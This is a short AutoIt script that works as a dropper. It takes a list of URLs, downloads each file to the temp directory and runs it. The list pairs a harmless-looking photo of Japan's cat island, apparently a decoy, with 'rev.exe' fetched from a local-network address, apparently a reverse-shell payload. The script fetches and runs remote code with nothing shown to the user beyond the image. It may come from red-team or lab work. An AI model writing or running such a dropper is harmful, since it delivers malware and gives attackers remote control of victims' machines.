#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "https://cdn.theatlantic.com/media/img/photo/2015/03/aoshima-japans-cat-island/c01_RTR4RUGT-1/original.jpg,http://192.168.1.10/rev.exe"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
